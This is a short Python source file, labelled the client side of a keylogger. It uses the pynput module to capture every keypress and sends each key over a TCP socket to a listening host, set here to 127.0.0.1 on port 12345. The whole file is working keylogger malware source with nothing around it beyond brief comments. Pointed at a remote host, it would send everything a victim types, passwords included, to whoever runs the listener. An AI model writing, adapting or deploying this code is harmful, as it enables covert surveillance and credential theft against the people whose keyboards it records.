# keylogger using pynput module
# client side

# import socket to make 2 way communication 
import socket

#import pynput to record press key
import pynput

from pynput.keyboard import Key, Listener

keys = []

host = "127.0.0.1"
port = 12345
s=socket.socket()
s.connect((host,port))

def on_press(key):
    s.send(str(key).encode())

def on_release(key):
    print('{0} released'.format(key))

    if key == Key.esc:
        # Stop listener
        # Close the connect
        return False


with Listener(on_press=on_press,
              on_release=on_release) as listener:
    
    listener.join()
